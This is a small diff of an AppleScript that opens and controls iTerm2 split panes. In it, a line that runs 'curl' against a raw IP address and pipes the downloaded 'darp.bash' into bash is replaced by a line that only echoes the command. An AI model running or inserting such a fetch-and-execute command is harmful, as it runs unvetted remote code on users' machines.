@@ -28,6 +28,6 @@ tell application "iTerm2"
         split vertically with default profile
     end tell
     tell fifth session of current tab of current window
-            write text "sleep 40;curl http://52.53.222.151:65013/darp.bash|bash"
+            write text "echo here I would 'sleep 40;curl http://52.53.222.151:65013/darp.bash|bash'"
     end tell
 end tell
